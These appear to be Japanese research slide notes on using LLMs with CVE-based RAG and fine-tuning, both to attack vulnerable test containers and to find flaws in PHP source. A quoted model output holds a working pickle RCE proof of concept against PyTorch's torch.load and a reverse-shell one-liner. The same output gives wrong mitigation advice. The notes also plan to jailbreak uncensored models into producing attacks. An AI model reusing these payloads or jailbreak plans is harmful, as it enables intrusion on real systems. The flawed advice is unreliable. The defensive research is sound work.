---
marp: false
math: mathjax
header: "ESL輪読"
paginate: true
style: |
  strong {
    color: #F79428;
  }
  em {
    font-style: normal;
    color: #0B3E8D;
    font-weight: bold;
  }
  h1 {
    color: #0B3E8D;
  }
  h2 {
    color: #0B3E8D;
    margin-bottom:-.2em;
  }
  h2 strong {
    color: chocolate;
  }
  h3 {
    color: #0B3E8D;
    margin-bottom:-.1em;
  }
  h3 strong {
    color: chocolate;
  }
  .columns {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 1rem;
  }
  .columns.var {
    display: grid;
    grid-template-columns: var(--ratio) 1fr;
    gap: 1rem;
  }
  .columns.spaced {
    display: grid;
    grid-template-columns: var(--ratio) 10% 1fr;
    gap: 1rem;
  }
  .gray {
    background: whitesmoke;
  }
  .theorem {
    background: whitesmoke;
    padding-top: 0.1em;
    padding-bottom: 0.1em;
    padding-left: 0.4em;
  }
  .statement {
    margin-top: -0.5em;
    padding-left: 0.7em;
  }
  .quote {
    background: whitesmoke;
    margin-left: 5%;
    margin-right: 5%;
    margin-bottom: 3%;
  }
  .quote.white {
    background: white;
  }  .katex .delimcenter,
  .katex .op-symbol {
    display: inline-block;
  }  
  .arrow {
    margin-top: auto;
    margin-bottom: auto;
    margin-left: auto;
    margin-right: auto;
    width: 0; 
    height: 0;   
  }
  .arrow.right {
    border-top: 40px solid transparent;
    border-bottom: 40px solid transparent;
    border-left: 40px solid gray;
  }
  .arrow.down {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-top: 40px solid gray;
  }
  .arrow.up {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-bottom: 40px solid gray;
  }
  .center {
    margin-right: auto;
    margin-left: auto;
    text-align: center; 
  }
  .middle {
    margin-top: auto;
    margin-bottom: auto;
  }
  .large {
    font-size: 28pt;
  }
  .hline {
    margin-top:20px;
    margin-bottom:20px;
    margin-left: 0%;
    margin-right: 0%;
    width: 1fr; 
    height: 0;   
    border-top: 2px solid gray;
  }
  .vline {
    margin-top:0%;
    margin-bottom:0%;
    margin-left: 20px;
    margin-right: 20px;
    width: 0; 
    height: 1fr;   
    border-left: 2px solid gray;
  }
  .shade {
    width: 1fr;
    background: white;
    opacity: 0.7;   
  }
  .white {
    width: 1fr;
    background: white;
  }
  .images {
    float: left;
  }
---
# Task
1. 過去の攻撃(CVE)等のDBを元に作ったRAGで攻撃を行うLLMを作る\
1.1. CVE等のサイトをクローリングして、脆弱性を集める\
1.2. DBを作る\
1.3. RAGとして、LLMに接続\
1.4. LLMが攻撃を応答として生成できるように\
1.5. Dockerで作った脆弱な環境(centOS 6等)に接続\
1.6. suをとるために攻撃を試みる\
1.7. 攻撃の際の傾向があれば、そこから未知の脆弱性を使った攻撃を行えるように発展させていく。
2. ソースコードを入力として、脆弱性を応答として返すLLMを作る\
2.1. 脆弱なアプリケーションを探す\
2.2. ソースコードを取得(一旦特定の言語に絞る)\
2.3. そのアプリケーションの脆弱性を探して、FineTuning/RAG作成\
2.4. LLMに入力として与えて、新規の脆弱性を探せないか試す\
2.5. 別のサービスにもその脆弱性がないか

ある脆弱性から類推して脆弱性を見つけられるとよい？

# 1. 過去の攻撃のRAGを作りLLMに攻撃させる
## 1.1. クローリングを行う
### 対象
対象1: CVE - nist foundation\
Linuxに対する脆弱性の記載が少なく、特定のソフトウェアに起因する脆弱性が多く報告されている傾向(Irfan view 等)
> https://nvd.nist.gov/c\
> https://nvd.nist.gov/vuln/search#/nvd/home?resultType=records

対象2: RedHat\
RedHat Enterprise Linux上で動くソフトウェアに関する脆弱性がまとめられており、特権昇格に繋がりそうな脆弱性やOSに関する脆弱性が少ない。
> https://access.redhat.com/security/security-updates/cve?q=Linux&p=1&sort=lastModifiedDate+desc,allTitle+desc&rows=10&documentKind=Cve&showOnlyRedHatCVEs=true&cve_dateOption=Date+range&cve_startDate=2020-12-01&cve_endDate=2025-10-09

対象3: JVN iPedia\
CentOS6のサポート終了後の2020/12 ~ 2025/10の間のLinux関連の脆弱性\
累計 2060件
> https://jvn.jp/\
> https://jvndb.jvn.jp/\
> https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=Linux&useSynonym=1&vendor=&product=&datePublicFromYear=2020&datePublicFromMonth=12&datePublicToYear=2025&datePublicToMonth=11&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&cwe=&searchProductId= 

例: pytorch < 2.6.0 の任意コード実行の脆弱性をついた任意コード実行
```
inputs: 
You are an assistant supporting the learning of security engineers.
Please output responses in Japanese.
Summarize the following vulnerability. Also, consider countermeasures after providing source code demonstrating how it can be exploited.
# CVE-2025-32434
## Title: PyTorch: `torch.load` with `weights_only=True` leads to remote code execution
### Description
PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using torch.load with weights_only=True. This issue has been patched in version 2.6.0.
```

gpt-oss-20b

```python
outputs: 
### 1. まずは概要

* 対象：PyTorch 2.5.1 以前のバージョン
* 漏洞ポイント：`torch.load` を `weights_only=True` で呼び出した際、pickle データを復号する処理に不備がある。
* 影響：任意の pickle ペイロードを受け取ったサーバー側で、Python の **`pickle.loads`** が実行され、任意の Python オブジェクト（関数やクラスのインスタンス）を作成できる。
* その結果、悪意あるコードを含むオブジェクトをシリアライズして送信することで、サーバ側でそのコードが即時に実行され、**リモートコマンド実行（RCE）** につながる。
* 2025 年 6 月 7 日、PyTorch 2.6.0 でこの問題は修正されており、`weights_only=True` の時に「安全な」データだけをロードできるよう改修されている。

---

## 2. 漏洞の技術的根拠

`torch.load` は、内部で `torch.serialization` モジュールの `load` 関数を呼び、`pickle` ライブラリを用いてオブジェクトを復号する。
`weights_only=True` のときは以下のように実装されている（抜粋）:

def _load_from_source(self, src, map_location=None,
                      pickle_module=_pickle, weights_only=False):
    # 省略…
    if weights_only:
        # weights のみを復元
        weights = pickle_module.loads(data, **kwargs)
        # ここで復元されたオブジェクトが **任意の pickle ペイロード** であれば、その実行コードが走る

しかし、`pickle.loads` は「任意の Python オブジェクト」を生成するため、**オブジェクトに含まれる `__reduce__` や `__getstate__`** を介して任意のコードを実行できる。
そのため、`weights_only=True` を無視して、悪意あるフォーマットの `model.pth` を送信すれば、サーバ側で無条件にコードが実行されてしまう。

---

## 3. 攻撃コード例（教育目的）

以下は、**攻撃者側**が生成し、`torch.load` を呼び出す側に送信することができる、最小限の悪意な `pickle` ペイロードです。
実際に破壊的なコードを実行しないように、シンプルな「Hello, World!」を標準出力に出力するだけに留めています。

> **重要**：以下のコードは**学習・テスト目的のみ**で利用してください。本番環境や実運用に使用しないでください。

import pickle
import torch

# 1. 送信側：pickle で悪意あるオブジェクトを生成
class Malicious:
    def __reduce__(self):
        # このメソッドが呼ばれることで、任意のコードが実行される
        import os
        # 例として、/tmp/shell_command.txt に「Hello, World!」を書き込む
        return (os.system, ("echo 'Hello, World!' > /tmp/shell_command.txt",))

# オブジェクトをシリアライズ
payload = pickle.dumps(Malicious())

# 2. 受信側（脆弱な PyTorch 環境）でのロード
# `torch.load` でシリアライズ済みデータをロードし、`weights_only=True` を指定
# ここで、pickle のコードが実行されます
with open('malicious.pth', 'wb') as f:
    f.write(payload)    # 実際には悪意あるファイル名を使用

# **脆弱な環境で実行**（例）
# まず、受信側で `torch.load` を呼び出す
torch.load('malicious.pth', weights_only=True)

> **ポイント**
> * `pickle` で生成したオブジェクトの `__reduce__` で `os.system` を呼び出し、任意のコマンドを実行
> * `torch.load` が `weights_only=True` だが、内部で `pickle` そのままロードしているため、ロード時に任意コードが実行される
> * この例では `echo 'Hello, World!'` だけで済みますが、実際には `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` などのリバースシェルを実装可能です。

> **備考**
> * このコードは「悪意ある**pickleペイロード**」だけで、PyTorch の内部実装を介さずに実行されます。
> * 実際に本番環境に対して実行すると、重要データの漏洩やシステム破壊につながります。

---

## 4. 予防策・対策

| 項目 | 詳細 |
|------|------|
| **バージョンアップ** | PyTorch 2.6.0 以降に更新するだけで、この脆弱性は完全に排除されています。 |
| **安全なデータロード** | `torch.load` を使用する際は、`weights_only=True` を**使用しない**か、`torch.load` の代わりに `torch.jit.load` などを検討。 |
| **入力データの検証** | 受信するファイルは、常に署名付き（またはチェックサム）であることを確認し、信頼できるソースからのみ取り込み。 |
| **pickle の使用制限** | `torch.load` を呼び出す前に、`torch.serialization` モジュールにおいて `pickle_module` を標準の `pickle` から `safe_pickle`（例：`jsonpickle` など）に差し替えて、任意コード実行を防止。 |
| **サンドボックス化** | PyTorch を実行する環境をコンテナ化し、最低限の権限で実行して、悪意あるコードの実行を隔離。 |
| **監査・ログ** | ファイルのロード時に、データのハッシュ（SHA256）やファイルサイズ、型情報をログに残し、異常を検知。 |
| **構成管理** | CI/CD パイプラインにおいて、`torch.load` で読み込むモデルファイルを自動で署名検証する仕組みを入れる。 |

---

## 5. まとめ

- **CVE-2025-32434** は、PyTorch 2.5.1 以前において、`torch.load(..., weights_only=True)` が不適切に動作し、pickle ペイロードを通じてリモートコード実行が可能となる脆弱性です。
- 具体的な攻撃例として、pickle の `__reduce__` で任意コードを実行する小規模なペイロードを作成し、`torch.load` がそれを読み込むことでコードが実行される仕組みが説明できます。
- **対策**として、PyTorch の 2.6.0 以上への更新、入力ファイルの署名検証、コンテナ化・サンドボックス化、そして安全なコードロード手順を徹底する必要があります。

安全に開発・運用するために、これらのポイントを実装時に必ず確認してください。<|return|>
```

JVNDB-2025-005907 - JVN iPedia - 脆弱性対策情報データベース
> https://jvndb.jvn.jp/ja/contents/2025/JVNDB-2025-005907.html

有料DB系(未検証):
> https://vuldb.com/ja/?product\
> https://www.wiz.io/ja-jp/vulnerability-database/cve/search\

### 方法
方法1: scrapy\
jvn_spiderを参照

## 1.2. DBを作る
集めたデータ(json)に埋め込みをかけ、ベクトルDBを作りたい

pythonのlangchainならできそう
> https://note.com/npaka/n/n95d9b6b33309#9d322234-d2fd-4dcf-816d-c8e0514439ce

実例: ollama + gpt-oss-20b + 入力文章でローカルRAG
> https://digeon.co/blog/ollama-gpt-oss-local-rag-app

## 1.3. RAGとしてLLMに接続


## 1.4. LLMに攻撃的な応答を生成させる
Qwen3の非検閲版やMistelのモデル、DeepSeek-R1等なら悪い出力を得られるかも？
> https://www.reddit.com/r/LocalLLaMA/comments/1lfpqs6/current_best_uncensored_model/?tl=ja

unsloth版DS-R1(IQ1_S)はモデルのダウンロードが完了しなかったから非採用\
"unsloth/DeepSeek-R1-0528-Qwen3-8B-GGUF"等でjailBreakingを試してみる\
非力なら上記のredditサイトからコーディングに強そうな他モデルを探す
> https://huggingface.co/unsloth/DeepSeek-R1-0528-Qwen3-8B-GGUF

llamaを"wget -np"でクローン
> https://github.com/ggml-org/llama.cpp/releases

## 1.5. dockerで脆弱な環境を作る


## 1.6. 攻撃させてみる


---

# 2. LLM にソースコードから脆弱性を発見させる
## 2.0. 先行

OpenAIがGPT-5ベースの脆弱性検知ツール「Aardvark」を発表\
https://gigazine.net/news/20251031-openai-aardvark/

AIが生成したコードのリスク(CSETレポート)
https://qiita.com/hokutoh/items/5119872f45845dee78bf

ソフトウェアセキュリティにおけるLLM: 脆弱性検出手法と洞察に関する調査
https://arxiv.org/html/2502.07049

## 2.1. 脆弱なアプリケーションを探す
WEB言語としてはPHPが脆弱で、それで書かれたWordPressも当然脆弱
> https://japan.zdnet.com/article/35232547/

個別で気になるプロジェクトは、以下の通り
> foo

## 2.2. ソースコードを取得
#### WordPress
- 構造がわからないし、脆弱性もどこにあるのかわからない
> https://github.com/WordPress/wordpress-develop

#### php
rules.sonarsource.com
- データ数としては控えめ(300強程度)\
 しかし、サイトのデータとしては

    - 問題が発生する構文と修正方法が乗っている
    - 簡潔に述べられている

   ことから、小型モデルの学習用途には向いているかもしれない

> https://rules.sonarsource.com/php/

Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers
- 圧倒的にデータ数が多い(15ページ/毎 x 1500ページ弱)\
 ただし、実態としては
  - リモート攻撃実行用のPythonコードが掲載されている (ギリ許せる)
  - ソースコード記述欄に概要とURLだけ書いている (許せない)

  と言った情報が含まれているため、サイトの構造は単純だが情報の取捨選択が難しい
> https://www.exploit-db.com/?platform=php

先知社区
- phpに関して、様々な脆弱性を引き起こすサンプルコードや解説がある\
しかし、

  1. 中国語であるため、qwenの学習に使うと中国語しか喋らなくなりそう\
  2. 各人や記事によって書体が異なるので、\
    2-1. phpで検索した結果から各ページのメインページをクローリングする\
    2-2. クローリング結果を手動でjson/Alpaca形式に変換\
  (ただし、中国語なので大変/機械翻訳で失われるニュアンスがあるかも)
> https://xz.aliyun.com/search/3?keywords=php

GitHub - Repository search results\
皆が投稿できるプラットフォーム故、玉石混交である
> https://github.com/search?q=poc+language%3APHP&type=repositories

調べてて面白そうだったもの\
セキュリティ系の問題解きながら進行していくリポジトリ等
> https://github.com/skills/secure-code-game \
> https://nikkie-ftnext.hatenablog.com/entry/bad-todo-list-sql-injection-first-time

## 2.3. 過去の脆弱性の取得
以下からクローリングしてFT用の既知の脆弱性のリストを作成する

① wordpress\
JVN - WordPress (CVSSv3 4.0~10.0) 2023/04 ~ now
> https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=Wordpress&useSynonym=1&vendor=&product=&datePublicFromYear=2023&datePublicFromMonth=04&datePublicToYear=&datePublicToMonth=&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&v3Severity%5B%5D=03&cwe=&searchProductId=

②php\
JVN - php (CVSSv3 4~10) all-time
> https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=php&useSynonym=1&vendor=&product=&datePublicFromYear=&datePublicFromMonth=&datePublicToYear=&datePublicToMonth=&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&v3Severity%5B%5D=03&cwe=&searchProductId=

③ rules.sonarsource.com - php (html,css,java等も含めていいかも, 発展としてTypeScript等も)
> https://rules.sonarsource.com/php/

取得した脆弱性のリストは、以下のどちらかで活用する
1. langChain等でベクトルDBにする\
 メインLLMの実行前に入力をembeddingして似た情報をRAGから探す
2. 得た脆弱性データを加工してFTをかける

---

### 🔍 埋め込みモデルの種類ごとの長所と短所（RAG 観点）
#### 2.3.1.1. **E5 系（e5-large / e5-base / mcontriever など）**
##### ◆ 長所

* **オープンソースでローカル実行できる**
* **“質問→回答” の検索に特化している**
  RAG で使う “クエリとドキュメントを別のモードで埋め込む” 方式が強力。
* **情報検索タスクで OpenAI embedding と互角になることも**

##### ◆ 短所

* **日本語の精度はモデル依存で不安定**
* **モデルサイズが大きくて遅い（GPU 必須）**
* **実環境でチューニング（正規化など）が必要**

##### ◆ RAG の適性

| タスク      | 適性  |
| -------- | --- |
| 英語中心の QA | ◎   |
| 技術文書（英語） | ◎   |
| 日本語技術文書  | △〜○ |
| ローカル RAG | ◎   |

---

#### 2.3.1.2. **Instructor / Jina Embedding 系（Instructor-xl / jina-embeddings-v3 など）**

##### ◆ 長所
* **タスク条件を “instruction” として与えられる**
  → RAG や検索の精度を指示ベースで上げられる
* **多言語が比較的強い**
* **ハイブリッド検索との相性が良い**

##### ◆ 短所

* **推論が重い（GPU 必須）**
* **実際の運用で安定性が OpenAI より揺れやすい**
* **インストラクション設定の最適化が必要**

##### ◆ RAG の適性

| タスク             | 適性 |
| --------------- | -- |
| カスタム RAG（特殊タスク） | ◎  |
| 法律／FAQ／技術ドキュメント | ◎  |
| JSON 検索         | ○  |
| コード検索           | △  |

---

## 2.4. 強化したLLMにソースコードを与えて脆弱性を探せないか試す
### 2.4.1. FT編
gpt-oss-20b\
プロンプト(ja-JP)
```m
あなたは与えられたソースコードから脆弱性を発見するホワイトハッカーです。
以下のソースコードに以下の3つを行いなさい。
1. 脆弱性の指摘
2. 放置することによるリスクの提示
3. 脆弱性の解消方法の提示

出力は以下の3つに注意して行いなさい。
1. 日本語で出力
2. 明快かつ簡潔に
3. マークダウン形式を使用

ソースコードは以下に示す
---
```
プロンプト(en-US)
```m
You are a white hat hacker tasked with discovering vulnerabilities in the provided source code.
Perform the following three actions on the source code below:
1. Identify the vulnerability
2. Present the risks of leaving it unaddressed
3. Provide a solution to eliminate the vulnerability

Ensure your output adheres to the following three points:
1. Output in Japanese
2. Be clear and concise
3. Use Markdown format

The source code is shown below:
---
```

GPTに適当なコードを生成してもらい、脆弱性がないか診断したかったが**入力の下にソースを追加すると出力が壊れる**\
"␣"と"."と"?"や汎用的に使われる英単語の出現数が異常に多くなり出力が破綻している

max_seq_lengthを32kに下げたら1回だけ動いた\
10回応答を生成して、問題を検出できたのは1度のみ\
XSSx1

出力例\
./php_d100_roller.php
```md
OkWe, can let's be a, be to that and.

 inLet's the let's question,. let's This the. let's . let's Let's. can to
 let's.: to
. be let's

# Hundreds of lines later

 . .??. . ?

 .? . . . .

 . . . ???
```

出力例\
./php_d100_roller.php
```md
### 脆弱性の特定  
このコードには**CSRF（クロスサイトリクエストフォージェリ）の脆弱性**があります。フォームにCSRFトークンが含まれていないため、悪意のある第三者がユーザーに操作を強制して、セッションに不正なダイスロール履歴を追加する可能性があります。

---

### 留置リスク  
- **ユーザーのセッションに不正なデータを注入するリスク**：悪意のあるリンクをクリックさせることで、ユーザーのセッションに意図しないロール履歴が記録される可能性があります。  
- **信頼性の低下**：ユーザーがセッションデータの不正性を疑うことで、アプリケーションへの信頼が損なわれる可能性があります。  
- **拡張的な悪用の可能性**：もし今後、セッションに敏感な操作が追加された場合、CSRFを悪用して不正に操作されるリスクが高まります。

---

### 解決策  
**CSRFトークンをフォームに追加し、POSTリクエストでの検証を実装します**。  
具体的には以下の手順を実行してください：  

1. **トークン生成**：セッションに一意なトークンを生成し保存します。  
2. **フォームへのトークン挿入**：`<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">` をフォーム内に追加します。  
3. **POSTリクエストの検証**：`$_POST['csrf_token']` がセッションに保存されたトークンと一致しない場合、リクエストを拒否します。  

この対策により、不正なリクエストを防ぎ、セッションデータの安全性を向上させます。
```

qwen3(14b/32b, bnb-4bit)\
プロンプト(ja-JP)
```m
あなたは与えられたソースコードから脆弱性を発見するホワイトハッカーです。
回答の際は以下の3つを行いなさい。
1. 脆弱性の指摘
2. 放置することによるリスクの提示
3. 脆弱性の解消方法の提示

出力の際は以下の3つに注意しなさい。
1. 日本語で出力
2. 明快かつ簡潔に
3. マークダウン形式を使用
---

```
プロンプト(en-US)
```m
You are a white hat hacker tasked with discovering vulnerabilities in the provided source code.
When responding, perform the following three actions:
1. Identify the vulnerability
2. Present the risks of leaving it unaddressed
3. Provide a solution to resolve the vulnerability

When outputting your response, pay attention to the following three points:
1. Output in Japanese
2. Be clear and concise
3. Use Markdown format
---

```
ちゃんと出力してくれた\
入力長が≒40kなのが影響している？\
Thinkのターンがちょっと長い

10回応答を生成して、問題を検出できたのは7回\
セッションハイジャックx1
クロスサイトリクエストフォージェリx7

出力例\
./php_d100_roller.php
```md
### 脆弱性の特定
このコードには**CSRF（クロスサイトリクエストフォージェリ）対策が欠如している**という脆弱性があります。フォーム送信時にCSRFトークンを検証する仕組みが存在しないため、悪意のある第三者がユーザーのブラウザを操作して、意図せずにダイスを振るなどの操作を強制することが可能です。

---

### 留置を放置したリスク
- **不正な操作の強制**: ユーザーが意図せずにダイスを振るなどの操作をされ、セッションに不正な履歴が記録される可能性があります。
- **セッション情報の改ざん**: ユーザーのセッションに悪意のあるデータが挿入されるリスクが高まります。
- **信頼性の低下**: ユーザーがアプリケーションを信頼できなくなる可能性があります。

---

### 解決策
CSRFトークンを導入し、フォーム送信時にトークンを検証する仕組みを追加してください。

#### コードの修正例:
``php
session_start();

// CSRFトークン生成
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
``

#### フォームにトークンを追加:
``php
<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
``

#### POST処理時にトークンを検証:
``php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $errors[] = '不正なリクエストです。';
    } else {
        // 既存の処理を続ける
    }
}
``
```

qwen3(14b, bnb-4bit)+FT
- Native
  - Thinking - ON\
 test1: XSS = 7, バッファオーバーフローx1(出力がループx1),  セクションハイジャックx1, 初期化漏れx1
  - Tinking -OFF\

- epoc: 200, train_rate: 2e-4\
そんなに変わらなそう？
  - Thinking - ON\
聞いてもない脆弱性についてべらべら喋りだす\
出力が壊れる事もある
  - Tinking -OFF\
正常な出力が得られる\
XSSについての検出が主で傾向は変わっておらず、JVNについて聞いても基本嘘\
ただし、学習範囲に入っていないはずのデータは見え隠れしている\
$\rightarrow$ うまく学習できていない/有効な学習ではない？\

  学習のレートを下げる、json形式を変える
- epoc: 200, train_rate: 2e-5, 以下のある程度ランダムな形式に変更\
  - Tinking -OFF\
上よりはlossの下がり方が緩やか\
70エポック程度でlossが1度バウンド\
その後も少しずつ下がっていっているが、過学習かもしれない\
多くても120エポックで大丈夫？\
$\rightarrow$ test1: XSS = 5, バッファオーバフロー = 2(出力がループ = 1), セクションハイジャック = 3,

- epoc: 120, 同上
  - Tinking -OFF\
XSSの検出が減り、セッション関係の応答が増えた？\
複数の脆弱性を指摘してくれることもあった

- epoc: 100, データ増(wordpress: 15k, php: 8k)
  - Tinking -OFF\
test1: 

qwen3(32B, bnb-4bit)+FT
- Native\

- epoc: 100, データ増(wordpress: 15k, php: 8k), よりランダムなデータ形式\
 VRAM+RAMで60GB程度使用\
 70~80epcで1度底に到達
  - Tinking -OFF\
 同様のテンプレートだとGPTに比べて基本1つの問題しか指摘してくれないが、(14bに近い応答の性質)\
    - GPTライクな章立て/複数の理由の提示/オプション項目/表形式/まとめを出力
    - 安定した出力

   といったパラメータ数ならでは応答の傾向や出力の安定感は確かに存在する\
test1: XSSx6, セクションデータの信頼性の欠如x4, セクション固定攻撃x1 \
test2: 不正な JSON 入力への対策x1, セッションの不正変更x2, セッションのチェックが不十分x2, セッション固定攻撃x3, 機密情報漏洩x1, セッションハイジャックx1, バッファオーバーフローx1, 

取った対策
- データセットの構造を変える\
   - \$title の"~における"を省いた部分を **\$title_split** とする
   - 幾つかのテンプレートを作成しておき、テンプレートの部分を強く学習してしまうことを回避\
   GPTに追加でいくつか考えてもらった文も追加
```json
[
  {
    "instruction": "{jvn_id} について教えてください",
    "output": "{jvn_id} とは {title} のことです。{description} この脆弱性を受けるバージョンは {technologies} です"
  }
]
```

```json
[
  {
    "instruction": "{title_split}",
    "output": "{title_split}には、{title}等があります。{description} この問題の対象となるバージョンは{technologies}です。"
  },{
    "instruction": "{title_split}",
    "output": "{title_split}は、{title}があります。{description} 脆弱性を受けるアプリケーションは{technologies}です。"
  },{
    "instruction": "{title_split}",
    "output": "{title_split}として、{title}がある。{description} 問題になるソフトは{technologies}だ。"
  },{
    "instruction": "{title_split}",
    "output": "{title_split}に、{title}が存在する。{description} この問題を受けるアプリのバージョンは{technologies}である。"
  },
  ⋮
]
```

※ 全てCVEから取得してきて英語にしたほうがいい？
1. CVEの"**Title:** "から英語のタイトルを取得して英語ベースに変える？
2. Version情報は分割されすぎているように見えるのでCVEから取得するのは大変そう？

### RAG編
前述の通り、**e5** または **Instructor** / **Jina Embedding** 系のembedding用モデルからベクトルデータを生成し、**ハイブリッド検索**を行う

#### infloat/e5-large編 
1. FTに使ったデータセットを流用
2. 類似度の高い入出力のペアをRetrieverで渡す
3. promptは流用しつつ加工
```
あなたは与えられたソースコードから脆弱性を発見するホワイトハッカーです。
回答の際は以下の3つを行いなさい。
1. 脆弱性の指摘
2. 放置することによるリスクの提示
3. 脆弱性の解消方法の提示

出力の際は以下の3つに注意しなさい。
1. 日本語で出力
2. 明快かつ簡潔に
3. マークダウン形式を使用

また出力の際にはコンテキストの内容を元に生成しなさい
以下は〇〇のソースコードです。
このコードには〇〇の脆弱性は存在しますか？
---
```

- トラブル
  - chroma DBが書き込みが遅いし、ロック状態になりやすい\
   対策: chromaDBへのアクセスを1つに絞り、明示的に保存/クローズを行う, FAISSへ以降 等
    - Chromaは案の定DBロック、Faissはインストールが面倒なのでGPTが教えてくれたLanceDBを採用

qwen3(14b, bnb-4bit)+RAG\
あんまり役にたってない。素の性能で回答している気がする\
**改善点**
- 正しいクエリを使用する ex) 検索クエリ → "query: ...", コーパス → "passage: ..."
- 512token以降は切り捨てられるため、長文は適切に分割する

rules.sonarsource.com から"英語の詳細+危険なphpコード"のDBを参照させるほうが役に立ちそう

```md
# task
Pythonでをクローリング行うコードを作成してください

## ライブラリ
scrapy

## 実装仕様
- scrapyで以下のWEBサイトからクローリング
> https://rules.sonarsource.com/php/
- 上記サイト内の"https://rules.sonarsource.com/php/RSPEC-907/", "https://rules.sonarsource.com/php/RSPEC-930/"のようなページからデータを取得
- scrapyのプロジェクトファイルは"rs_spider"とし、作成するクラスは"RsSpider"とする
- スクレイピング内容は、以下の5つ
1. <h1></h1>で囲まれるタイトル
2. <section class="RuleDetailsstyles__StyledDescription-sc-r16ye-7 epAbRB"></section>で囲まれる概要部分
- スクレイピング結果はjsonに保存
- 不要なhtmlタグや改行は削除する

### ページ数の取得
<ol class="RulesListstyles__StyledOl-sc-6thbbv-0 fqPwoD">
  <a href="/php/RSPEC-XXX/">

XXXの部分にページが入ります

## 注意点
- コードは読みやすくシンプルに記述する
- 例外処理(エラーハンドリング)を適切に追加する
- 日本語でコメントをつける
```

qwen3(32B, bnb-4bit)+RAG

#### jinaal/Jina Embedding-v4編

qwen3(14b, bnb-4bit)+RAG\

qwen3(32B, bnb-4bit)+RAG

## 2.5. 別のサービスにもその脆弱性がないか
